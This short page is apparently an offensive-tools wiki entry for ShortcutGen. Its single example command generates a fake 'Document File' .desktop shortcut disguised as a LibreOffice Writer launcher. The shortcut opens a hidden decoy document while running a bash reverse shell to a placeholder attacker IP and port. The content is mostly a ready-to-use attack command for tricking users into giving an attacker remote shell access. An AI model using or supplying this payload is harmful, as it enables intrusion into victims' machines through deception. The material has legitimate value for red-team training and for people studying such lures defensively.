# Offensive Tools

## [[ShortcutGen|ShortcutGen]]

Generate a payload with one-liner reverse shell.

```
$ shortcutgen -p desktop -n "Document File" -c "libreoffice" -a " --writer \"\$(pwd)/.real_document.odt\"; /bin/bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1" --icon "libreoffice-writer" --workingdirectory "/tmp/" -w "false" -o payload.desktop
```